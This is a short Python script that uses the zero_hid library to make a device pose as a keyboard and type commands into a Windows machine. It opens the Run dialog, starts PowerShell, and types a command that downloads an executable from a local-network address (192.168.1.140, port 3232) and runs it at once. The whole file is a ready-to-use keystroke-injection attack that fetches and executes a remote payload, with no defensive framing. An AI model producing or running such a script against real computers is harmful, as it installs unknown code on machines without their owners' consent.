from zero_hid import Keyboard, KeyCodes
from zero_hid.hid import keycodes
from time import sleep


with Keyboard() as k:
    k.press([KeyCodes.MOD_LEFT_GUI], KeyCodes.KEY_R)
    sleep(2)
    k.type("powershell")
    k.press([], KeyCodes.KEY_ENTER)
    sleep(2)
    k.type("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
